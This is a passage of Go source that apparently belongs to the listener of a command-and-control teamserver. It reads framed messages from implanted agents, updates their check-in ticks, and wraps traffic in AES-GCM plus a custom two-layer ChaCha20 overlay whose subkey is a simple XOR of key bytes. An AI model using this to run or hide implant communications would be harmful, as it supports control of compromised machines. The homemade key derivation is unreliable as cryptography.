		n, _, rerr := syscall.Recvfrom(int(fd), hdr[:], syscall.MSG_PEEK|syscall.MSG_DONTWAIT)
		hdrN = n
		peekErr = rerr
		return true
	})
	if hdrN == 0 && peekErr == nil {
		return io.EOF // peer sent FIN
	}
	if peekErr != nil && peekErr != syscall.EAGAIN && peekErr != syscall.EWOULDBLOCK {
		return peekErr
	}
	if hdrN < 4 {
		return nil // partial header: wait for the rest
	}

	msgLen := binary.BigEndian.Uint32(hdr[:4])
	if msgLen == 0 || msgLen > maxFrameLen {
		return fmt.Errorf("invalid message length %d", msgLen)
	}

	if msgLen <= drainPeekLimit {
		// Pre-flight the whole frame with MSG_PEEK; consume only when fully
		// buffered. A non-blocking peek returning fewer bytes than the frame
		// means the agent is mid-send — wait for the next cycle.
		peekBuf := make([]byte, 4+int(msgLen))
		peekN := 0
		_ = rawConn.Read(func(fd uintptr) bool {
			n, _, rerr := syscall.Recvfrom(int(fd), peekBuf, syscall.MSG_PEEK|syscall.MSG_DONTWAIT)
			peekN = n
			peekErr = rerr
			return true
		})
		if peekErr != nil && peekErr != syscall.EAGAIN && peekErr != syscall.EWOULDBLOCK {
			return peekErr
		}
		if peekN < 4+int(msgLen) {
			return nil
		}
	}

	// Frame is fully buffered: consume it (these reads cannot block).
	return t.consumeFrame(conn, agentId, ts, msgLen)
}

// consumeFrame 把"帧已就绪"之后的消费动作收成一处：TCP（MSG_PEEK 预检过）与
// libp2p（bufio.Peek 预检过）**共用同一份实现**。
//
// ★ 为什么必须共用而不是各写一份：这里的两个副作用（TsAgentSetTick /
// TsAgentProcessData）是会话存活与任务回执的关键。两份实现一旦漂移，症状是
// "某种传输下 tick 不更新 / 回执丢失"——而这种漂移在代码审查里几乎看不出来
// （两份都"对"，只是有一份少了一行）。
// ★↑ 上面四行**顶格**不是排版失误：doc comment 里缩进的续行会被 Go 1.19+ 当作
// 代码块重排成 `//\t`（本项目踩过三次）。测试见 verify() 的 gofmt 净贡献断言。
func (t *TransportTCP) consumeFrame(conn net.Conn, agentId string, ts Teamserver, msgLen uint32) error {
	if _, err := connRead(conn, 4); err != nil {
		return err
	}
	recvData, err := connRead(conn, int(msgLen))
	if err != nil {
		return err
	}

	_ = ts.TsAgentSetTick(agentId, t.Name)
	_ = ts.TsAgentProcessData(agentId, recvData)
	return nil
}

func listenerDeriveSubkey(sk, salt []byte) []byte {
	out := make([]byte, 16)
	for i := 0; i < 16; i++ {
		out[i] = sk[i] ^ sk[(i+1)%16] ^ salt[i]
	}
	return out
}

// ---- ChaCha20 (16-byte key variant, 96-bit nonce) — mirrors the agent's C implementation ----

func chachaQr(a, b, c, d *uint32) {
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 16)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 12)
	*a += *b
	*d ^= *a
	*d = bits.RotateLeft32(*d, 8)
	*c += *d
	*b ^= *c
	*b = bits.RotateLeft32(*b, 7)
}

func chacha20Block(key [4]uint32, nonce [3]uint32, counter uint32) [64]byte {
	state := [16]uint32{
		0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expand 16-byte k"
		key[0], key[1], key[2], key[3],
		key[0], key[1], key[2], key[3],
		counter,
		nonce[0], nonce[1], nonce[2],
	}
	working := state
	for r := 0; r < 10; r++ {
		chachaQr(&working[0], &working[4], &working[8], &working[12])
		chachaQr(&working[1], &working[5], &working[9], &working[13])
		chachaQr(&working[2], &working[6], &working[10], &working[14])
		chachaQr(&working[3], &working[7], &working[11], &working[15])
		chachaQr(&working[0], &working[5], &working[10], &working[15])
		chachaQr(&working[1], &working[6], &working[11], &working[12])
		chachaQr(&working[2], &working[7], &working[8], &working[13])
		chachaQr(&working[3], &working[4], &working[9], &working[14])
	}
	var out [64]byte
	for i := 0; i < 16; i++ {
		binary.LittleEndian.PutUint32(out[4*i:], working[i]+state[i])
	}
	return out
}

func listenerChaCha20Xor(key16, nonce12, data []byte) []byte {
	if len(key16) != 16 || len(nonce12) != 12 {
		return nil
	}
	var key [4]uint32
	for i := 0; i < 4; i++ {
		key[i] = binary.LittleEndian.Uint32(key16[4*i:])
	}
	var nonce [3]uint32
	for i := 0; i < 3; i++ {
		nonce[i] = binary.LittleEndian.Uint32(nonce12[4*i:])
	}
	out := make([]byte, len(data))
	var counter uint32
	for off := 0; off < len(data); off += 64 {
		block := chacha20Block(key, nonce, counter)
		n := len(data) - off
		if n > 64 {
			n = 64
		}
		for i := 0; i < n; i++ {
			out[off+i] = data[off+i] ^ block[i]
		}
		counter++
	}
	return out
}

func listenerTransportOverlay(buf []byte, sk, salt []byte, nonce []byte, decrypt bool) []byte {
	sub := listenerDeriveSubkey(sk, salt)
	if decrypt {
		x := listenerChaCha20Xor(sub, nonce, buf)
		return listenerChaCha20Xor(sk, nonce, x)
	}
	x := listenerChaCha20Xor(sk, nonce, buf)
	return listenerChaCha20Xor(sub, nonce, x)
}

func listenerSplitKey(key []byte) (aesKey, salt []byte, err error) {
	if len(key) >= 32 {
		return append([]byte(nil), key[:16]...), append([]byte(nil), key[16:32]...), nil
	}
	if len(key) == 16 {
		return key, make([]byte, 16), nil
	}
	return nil, nil, fmt.Errorf("key too short: %d", len(key))
}

func EncryptData(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := listenerSplitKey(key)
	if err != nil {
		return nil, err
	}
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}
	inner := gcm.Seal(nonce, nonce, data, nil)

	// ChaCha20 double overlay with a fresh per-message nonce
	cnonce := make([]byte, 12)
	if _, err = io.ReadFull(rand.Reader, cnonce); err != nil {
		return nil, err
	}
	out := listenerTransportOverlay(inner, aesKey, salt, cnonce, false)

	res := make([]byte, 12+len(out))
	copy(res, cnonce)
	copy(res[12:], out)
	return res, nil
}

func DecryptData(data []byte, key []byte) ([]byte, error) {
	aesKey, salt, err := listenerSplitKey(key)
	if err != nil {
		return nil, err
	}
	if len(data) < 12 {
		return nil, fmt.Errorf("ciphertext too short")
	}
	cnonce := data[:12]
	body := data[12:]

	inner := listenerTransportOverlay(body, aesKey, salt, cnonce, true)

	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	ns := gcm.NonceSize()
	if len(inner) < ns {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := inner[:ns], inner[ns:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}
